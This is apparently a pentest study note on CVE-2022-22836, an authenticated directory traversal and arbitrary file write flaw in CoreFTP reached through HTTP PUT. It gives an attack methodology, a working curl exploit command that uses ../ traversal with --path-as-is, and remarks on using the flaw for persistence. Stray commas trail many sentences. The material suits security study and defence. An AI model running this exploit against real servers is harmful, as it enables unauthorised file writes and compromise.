### **CoreFTP: Authenticated Directory Traversal & Arbitrary File Write**

#### **Vulnerability Overview**

|Vulnerability|CVE|Impact|
|:--|:--|:--|
|**Directory Traversal / Arbitrary File Write**|CVE-2022-22836|Allows writing files outside the authorized service directory via path traversal.,|

#### **Scenario Context**

This technique is applicable to **CoreFTP (before build 727)**. While the service typically uses HTTP POST for file uploads, it incorrectly processes **HTTP PUT** requests., This allows an authenticated user to bypass directory restrictions by misinterpreting user-provided paths.

#### **Attack Methodology**

1. **Request Construction**: Specify an HTTP PUT request instead of the standard POST method.
2. **Path Traversal**: Use escape characters (`../../../../`) in the file path to break out of the restricted service folder.,
3. **Authorization Bypass**: Leverage the application's failure to validate paths for the PUT method, which allows permissions to be bypassed if the user is authenticated.,
4. **Arbitrary File Write**: Provide the desired file content and filename; the service process writes this data to the specified location on the local system.

#### **Command Reference**

**Exploitation via cURL**

```
curl -k -X PUT -H "Host: <TARGET_IP>" --basic -u <USERNAME>:<PASSWORD> --data-binary "PoC." --path-as-is https://<TARGET_IP>/../../../../../../whoops
```

|Parameter|Function|
|:--|:--|
|`-k`|Ignores SSL/TLS certificate warnings.|
|`-X PUT`|Forces the use of the **HTTP PUT** request method.|
|`-H "Host: <TARGET_IP>"`|Sets the Host header for the target system.|
|`--basic -u <USERNAME>:<PASSWORD>`|Provides credentials for **Basic Authentication**.|
|`--data-binary "<CONTENT>"`|Specifies the raw content to be written to the target file.,|
|`--path-as-is`|Prevents cURL from resolving/squashing the `../` traversal characters before sending the request.|

#### **Attack Implications**

- **Privilege Escalation/Persistence**: Successfully writing a file outside the authorized folder can lead to further compromise if sensitive locations (like startup folders or web roots) are targeted.,
- **System Verification**: A successful attack can be verified by checking for the created file on the target system (e.g., `C:\whoops`).

#### **Misconfiguration/Vulnerability Details**

|Component|Failure Point|
|:--|:--|
|**HTTP Method Handling**|Service permits **HTTP PUT** when it should only process POST for uploads.|
|**Input Validation**|The process fails to sanitize directory traversal characters in the path.,|
|**Permission Control**|Path restrictions only apply to specific folders; breaking out via traversal bypasses these checks.|